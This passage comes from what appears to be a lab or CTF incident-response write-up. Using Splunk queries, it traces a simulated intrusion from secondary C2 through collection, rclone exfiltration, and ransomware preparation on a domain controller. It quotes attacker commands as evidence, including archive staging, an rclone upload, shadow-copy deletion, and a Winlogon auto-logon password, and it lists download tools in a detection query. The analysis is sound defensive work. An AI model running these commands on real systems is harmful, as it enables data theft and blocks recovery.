> **What it should show:** `agegamepay.com`, `ws2_32.exe`, `10.10.5.245`.

## DNS Evidence

```text
2025-08-25 14:05:06
ws2_32.exe queried agegamepay.com
Resolved IP: 10.10.5.245
```

## Network Pivot

<details>
<summary><strong>Network Query</strong></summary>

```spl
index=* host="FILES-Server" EventCode=3 DestinationIp=10.10.5.245
| search Image=*ws2_32.exe* OR Image=*system_module*
| table _time, Image, SourceIp, DestinationIp, DestinationPort
| sort - _time
```

</details>

## Screenshot

![Secondary C2 network connections](./screenshots/20-secondary-c2-network.png)

> **Screenshot source:** PDF page 23  
> **What it should show:** ports `8443` and `8083`.

## Network Evidence

```text
ws2_32.exe        -> 10.10.5.245:8443
system_module.exe -> 10.10.5.245:8083
```

## Finding

The secondary payloads connected to:

```text
agegamepay.com
10.10.5.245:8443
10.10.5.245:8083
```

## Confidence

**High**

## Next Pivot

After confirming secondary C2, I checked whether the attacker staged or exfiltrated data.

---

# 17. Collection

## What I Was Trying to Determine

I wanted to determine whether the attacker collected or staged sensitive data before exfiltration.

## Why I Pivoted to Archive Commands

Attackers commonly compress files before exfiltration. I searched for archive-related PowerShell commands.

## Analyst Reasoning

After confirming C2 and payload activity on `FILES-SERVER`, I checked for collection because attackers often stage data before exfiltration. Compression commands are a common sign of staging because multiple files can be bundled into a single archive for transfer.

The `Compress-Archive` command identified the specific files targeted and the archive path, which gave me a clear bridge from collection to exfiltration.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" host="FILES-Server" EventCode=1
| search CommandLine="*Archive*" OR CommandLine=*Compress*
| table _time, Image, CommandLine, ParentImage
| sort - _time
```

</details>

## Screenshot

![Data collection via Compress-Archive](./screenshots/21-collection-compress-archive.png)

> **Screenshot needed:** You may need to capture/add this screenshot.  
> **What it should show:** `Compress-Archive`, `Finance.csv`, `HR.csv`, `teams-skartech.zip`.

## Evidence Observed

Timestamp:

```text
2025-08-25 14:17:04
```

Command:

```text
powershell -c "Compress-Archive -Path 'C:\Shares\Shares\Finance.csv','C:\Shares\Shares\HR.csv' -DestinationPath 'C:\ProgramData\Teams\teams-skartech.zip'"
```

Files staged:

```text
C:\Shares\Shares\Finance.csv
C:\Shares\Shares\HR.csv
```

Archive created:

```text
C:\ProgramData\Teams\teams-skartech.zip
```

## Finding

The attacker compressed sensitive files into `teams-skartech.zip`.

## Confidence

**High**

## Next Pivot

After identifying staged data, I searched for transfer tooling or outbound copy commands.

---

# 18. Exfiltration

## What I Was Trying to Determine

I wanted to determine whether the staged archive was transferred out of the environment.

## Why I Pivoted to Rclone

`rclone` is a legitimate file synchronisation tool that attackers commonly abuse to move data to cloud storage.

## Analyst Reasoning

I searched for `rclone` because once data was compressed, the next question was whether it left the environment. `rclone` is a legitimate cloud sync tool but is commonly abused for exfiltration.

The command copying `teams-starktech.zip` to `remote:starktech-backups` provided direct evidence of an attempted or completed upload to remote storage.

## Evidence Observed

Rclone setup:

```text
2025-08-25 14:22:24
powershell -Command "Expand-Archive -Path 'C:\ProgramData\teams\rclone+config.zip' -DestinationPath 'C:\ProgramData\teams\rclone' -Force"
```

Rclone upload:

```text
2025-08-25 14:25:03
cmd.exe /c "C:\ProgramData\Teams\rclone\rclone-v1.71.0-windows-amd64\rclone.exe copy teams-starktech.zip remote:starktech-backups"
```

Remote destination:

```text
remote:starktech-backups
```

## Screenshot

![rclone exfiltration](./screenshots/22-rclone-exfiltration.png)

> **Screenshot source:** PDF page 25  
> **What it should show:** rclone extraction and copy to `remote:starktech-backups`.

## What This Meant

The attacker used a legitimate sync tool to upload the staged archive to remote storage.

## Finding

The attacker exfiltrated the staged archive to:

```text
starktech-backups
```

## Confidence

**High**

## Next Pivot

After confirming exfiltration from `FILES-SERVER`, I investigated the later access to `DC01`.

---

# 19. DC01 Activity and Impact Preparation

## What I Was Trying to Determine

After confirming `admin143` authenticated to `DC01`, I needed to determine what the attacker did on the domain controller.

## Why I Pivoted to DC01 Process Creation

DC01 is a high-value asset. Process creation after lateral movement can show whether the attacker staged scripts, modified the system, or prepared impact actions.

## Analyst Reasoning

I investigated DC01 separately because domain controller activity has higher impact than workstation or file server activity. After confirming `admin143` authenticated to DC01, I focused on process creation events to see whether the attacker staged scripts, changed registry settings, or prepared destructive actions.

The script downloads, Winlogon auto-logon modification, shadow copy deletion, and ransom-note-style file showed activity consistent with impact preparation. I would describe this as ransomware preparation unless encryption execution is directly confirmed.

## DC01 Logon Evidence

```text
2025-08-25 14:34:30
admin143 logged into DC01 from 10.10.5.62
```

## Screenshot

![DC01 lateral movement](./screenshots/23-dc01-logon.png)

> **Screenshot source:** PDF page 17  
> **What it should show:** `admin143`, `10.10.5.62`, `DC01`, timestamp `14:34:30`.

<details>
<summary><strong>Script Download Query</strong></summary>

```spl
index="main" host="DC01" EventCode=1
| search CommandLine=*Invoke* OR CommandLine=*BitsTransfer* OR CommandLine=*certutil* OR CommandLine=*bitsadmin*
| table _time, Image, CommandLine, ParentImage
| sort _time
```

</details>

## Evidence Observed

```text
2025-08-25 14:36:51 - crypto.psm1 downloaded to C:\ProgramData\crypto.psm1
2025-08-25 14:37:57 - script.ps1 downloaded to C:\ProgramData\script.ps1
2025-08-25 14:44:11 - dhsf82.bat downloaded to C:\ProgramData\Microsoft\dhsf82.bat
```

## Auto-Logon Registry Modification

At:

```text
2025-08-25 14:46:02
```

registry commands modified:

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Values set:

```text
AutoAdminLogon = 1
DefaultUserName = Main\william
DefaultPassword = CyberNight!128
```

## Shadow Copy Deletion

Command observed:

```text
vssadmin delete shadows /all /quiet
```

## Ransom Note Indicator

File observed:

```text
Recover-Files.txt
```

## Screenshot

![DC01 impact preparation](./screenshots/24-dc01-impact-preparation.png)

> **Screenshot needed:** You still need to capture/add this screenshot if not already in your PDF.  
> **What it should show:** `crypto.psm1`, `script.ps1`, `dhsf82.bat`, Winlogon registry modification, `vssadmin`, or `Recover-Files.txt`.

## What This Meant

The attacker moved beyond access and exfiltration into activity consistent with ransomware or destructive impact preparation.

## Finding

DC01 activity showed:

```text
script staging
auto-logon registry modification
shadow copy deletion
ransom note indicator
```

## Confidence

| Finding | Confidence |
|---|---|
| Script downloads | High |
| Auto-logon modification | High |
| Shadow copy deletion | High |
| Ransomware preparation | Medium to High unless encryption is fully confirmed |

---

# 20. Investigation Timeline

| Time | Host | User / Process | Activity | Interpretation |
|---|---|---|---|---|
| 2025-08-25 13:27:40 | DESKTOP | `t.leon` / `msedge.exe` | DNS/browser visit to `paste.sh` | Initial suspicious URL access |
| ~13:30 | DESKTOP | `t.leon` / PowerShell | Download/execution of `iexploreplugin.exe` | Payload delivery |
| After execution | DESKTOP | `iexploreplugin.exe` | Event ID profile reviewed | Telemetry scoping |
| After execution | DESKTOP | `iexploreplugin.exe` | Connection to `10.10.5.62:8080` | Initial suspected C2 |
| After execution | DESKTOP | `iexploreplugin.exe` | Discovery commands executed | Reconnaissance |
| After execution | DESKTOP | `iexploreplugin.exe` | Injection into `notepad.exe` and `spoolsv.exe` | Process injection / migration |
| ~13:35 | DESKTOP | `notepad.exe` | `20250825133552_BloodHound.zip` created | AD enumeration output |
| ~13:45 | DESKTOP | PowerShell / `msiexec` | Atera installer downloaded and installed | RMM persistence |
| 2025-08-25 13:47:10 | DESKTOP | Scheduled task artefact | `Monitoring Recovery` created | Scheduled task persistence |
| 2025-08-25 13:51:17 | DESKTOP | File creation | `scvhost.vbs` created | Script staged |
| 2025-08-25 13:51:18 | DESKTOP | Scheduled task artefact | `AteraAgentServiceWatchdog` created | Atera watchdog persistence |
| 2025-08-25 13:52:25 | DESKTOP | `cscript.exe` | `scvhost.vbs` creates `iexplorer.lnk` | Shortcut persistence |
| 2025-08-25 13:53:40 | DESKTOP | PowerShell | Defender real-time monitoring disabled | Defence evasion |
| 2025-08-25 13:55:22 | DESKTOP | `iexploreplugin.exe` | Accesses `spoolsv.exe` | Process migration support |
| 2025-08-25 13:56:54 | DESKTOP | `spoolsv.exe` | Accesses `lsass.exe` | Suspected credential access |
| 2025-08-25 13:58:52 | FILES-SERVER | `admin143` | Logon Type 3 from `10.10.5.62` | Lateral movement |
| 2025-08-25 13:58:53 | FILES-SERVER | `admin143` | `whoami` executed | Post-logon validation |
| 2025-08-25 14:00:33 | FILES-SERVER | PowerShell | `python.zip` downloaded | Payload staging |
| 2025-08-25 14:03:00 | FILES-SERVER | PowerShell | `python.zip` extracted | Payload extraction |
| 2025-08-25 14:03:51 | FILES-SERVER | `testc.exe` | Loads `python311.dll`; creates `ws2_32.exe` | Suspected DLL side-loading |
| 2025-08-25 14:03:52 | FILES-SERVER | `testc.exe` | Creates `system_module.exe` | Additional payload |
| 2025-08-25 14:05:06 | FILES-SERVER | `ws2_32.exe` | DNS query for `agegamepay.com` | Secondary C2 |
| 2025-08-25 14:05:08+ | FILES-SERVER | `ws2_32.exe` | Connects to `10.10.5.245:8443` | Secondary C2 |
| 2025-08-25 14:05:08+ | FILES-SERVER | `system_module.exe` | Connects to `10.10.5.245:8083` | Secondary C2 |
| 2025-08-25 14:17:04 | FILES-SERVER | PowerShell | `Finance.csv` and `HR.csv` compressed | Collection |
| 2025-08-25 14:22:24 | FILES-SERVER | PowerShell | `rclone+config.zip` extracted | Exfil tooling setup |
| 2025-08-25 14:25:03 | FILES-SERVER | `rclone` | Archive copied to `remote:starktech-backups` | Exfiltration |
| 2025-08-25 14:34:30 | DC01 | `admin143` | Logon Type 3 from `10.10.5.62` | Lateral movement to DC01 |
| 2025-08-25 14:36:51 | DC01 | `certutil` | `crypto.psm1` downloaded | Impact prep |
| 2025-08-25 14:37:57 | DC01 | `certutil` | `script.ps1` downloaded | Impact prep |
| 2025-08-25 14:44:11 | DC01 | `certutil` | `dhsf82.bat` downloaded | Auto-logon script staged |
| 2025-08-25 14:46:02 | DC01 | `reg.exe` | Winlogon keys modified | Auto-logon persistence |
| Later | DC01 | `vssadmin` | Shadow copies deleted | Recovery inhibition |
| Later | DC01 | File download | `Recover-Files.txt` downloaded | Ransom note indicator |

---

# 21. Screenshot Checklist

| Screenshot file | Section | Source page | Must show |
|---|---|---:|---|
| `02-dns-paste-sh.png` | Initial Access | Page 2 | `paste.sh`, `t.leon`, `13:27:40` |
| `03-browser-history.png` | Browser Validation | Pages 2–3 | Edge History / SQLite / timestamp decode |
| `04-paste-powershell.png` | Execution | Page 4 | PowerShell content from `paste.sh` |
| `05-iexploreplugin-execution.png` | Execution | Pages 4–5 | `iexploreplugin.exe` execution in Splunk |
| `06-eventid-profile-iexploreplugin.png` | Event ID Profiling | Pages 5–6 | Event IDs triggered by `iexploreplugin.exe` |
| `07-initial-c2.png` | Initial C2 | Page 7 | `10.10.5.62:8080` |
| `08-discovery-commands.png` | Recon | Page 8 | `cmdkey`, `net user`, `whoami`, `tasklist`, etc. |
| `09-process-injection.png` | Process Injection | Page 9 | `notepad.exe`, `spoolsv.exe` |
| `10-rmm-persistence.png` | Persistence | Page 12 | Atera, Splashtop, AnyDesk |
| `11-scheduled-tasks.png` | Scheduled Tasks | Pages 13–14 | `Monitoring Recovery`, `AteraAgentServiceWatchdog` |
| `12-scvhost-shortcut.png` | Shortcut Persistence | Pages 14–15 | `scvhost.vbs`, `cscript.exe`, `.lnk` evidence |
| `13-defender-evasion.png` | Defence Evasion | Pages 15–16 | `Set-MpPreference -DisableRealtimeMonitoring` |
| `14-lsass-access.png` | Credential Access | Page 26 | `spoolsv.exe` / `iexploreplugin.exe` accessing `lsass.exe` |
| `15-fileserver-logon.png` | Lateral Movement | Page 16 | `admin143`, `10.10.5.62`, `13:58:52` |
| `16-fileserver-command-execution.png` | Lateral Movement | Pages 18–19 | `whoami` at `13:58:53` |
| `17-python-zip.png` | Payload Staging | Pages 19–20 | `python.zip`, `testc.exe`, `python311.dll` |
| `18-testc-dropped-files.png` | Secondary Payload | Pages 20–21, 23 | `ws2_32.exe`, `system_module.exe`, DLL load |
| `19-secondary-c2-dns.png` | Secondary C2 | Page 22 | `agegamepay.com`, `10.10.5.245` |
| `20-secondary-c2-network.png` | Secondary C2 | Page 23 | `8443`, `8083` |
| `21-collection-compress-archive.png` | Collection | New screenshot needed | `Compress-Archive`, `Finance.csv`, `HR.csv`, `teams-skartech.zip` |
| `22-rclone-exfiltration.png` | Exfiltration | Page 25 | rclone copy to `remote:starktech-backups` |
| `23-dc01-logon.png` | DC01 Activity | Page 17 | `admin143`, `10.10.5.62`, `14:34:30` |
| `24-dc01-impact-preparation.png` | Impact Prep | New screenshot needed | `crypto.psm1`, `script.ps1`, `dhsf82.bat`, Winlogon, `vssadmin`, `Recover-Files.txt` |

---

# 22. Analyst Notes

Several findings were treated carefully rather than overstated.

LSASS access by `spoolsv.exe` strongly supports credential access, especially because `spoolsv.exe` was previously linked to process injection. However, without dumped hashes or credential output, I would describe this as **suspected credential access** rather than confirmed credential dumping.

`testc.exe` loading `python311.dll` from the extracted directory supports suspected DLL side-loading or DLL-based execution. I would keep the wording cautious unless the DLL load path and search-order behaviour fully confirm side-loading.

The `Recover-Files.txt` file, script downloads, and shadow copy deletion strongly indicate ransomware or destructive impact preparation. However, I would avoid claiming confirmed encryption unless encrypted files or encryption execution are directly observed.

Event ID profiling was used throughout the investigation to avoid random searching. By first checking which event types were triggered by suspicious processes, I could decide whether to pivot into process execution, network connections, file creation, image loads, process access, registry events, or DNS queries.

This distinction matters because good investigations separate confirmed facts from reasonable hypotheses and use available telemetry to drive pivots.

---

# 23. Final Summary

The investigation started with a suspicious `paste.sh` visit by user `t.leon` on `DESKTOP` at **13:27:40**. Browser history confirmed the URL visit, and the page contained a PowerShell command that downloaded and executed `iexploreplugin.exe`.

After confirming execution, I profiled the Event IDs generated by `iexploreplugin.exe` to understand what telemetry was available. This showed activity across process creation, network connections, file creation, process injection, process access, registry events, image loads, and DNS queries.

`iexploreplugin.exe` established communication with `10.10.5.62:8080`, executed discovery commands, injected into `notepad.exe` and `spoolsv.exe`, installed RMM tools for persistence, created scheduled task and shortcut persistence, and disabled Defender real-time monitoring.

The attacker then accessed LSASS through the migrated `spoolsv.exe` process, supporting suspected credential access. Shortly after, `admin143` authenticated to `FILES-SERVER` from `10.10.5.62`, followed immediately by command execution.

On `FILES-SERVER`, the attacker downloaded and extracted `python.zip`, executed `testc.exe`, dropped `ws2_32.exe` and `system_module.exe`, established secondary C2 through `agegamepay.com`, compressed sensitive files, and exfiltrated the staged archive using `rclone`.

The attacker later accessed `DC01`, downloaded scripts associated with impact preparation, modified Winlogon auto-logon registry values, deleted shadow copies, and downloaded a ransom-note-style file.

Overall, the evidence supports a multi-stage attack chain covering initial access, execution, telemetry scoping, C2, discovery, process injection, persistence, defence evasion, credential access, lateral movement, collection, exfiltration, and impact preparation.
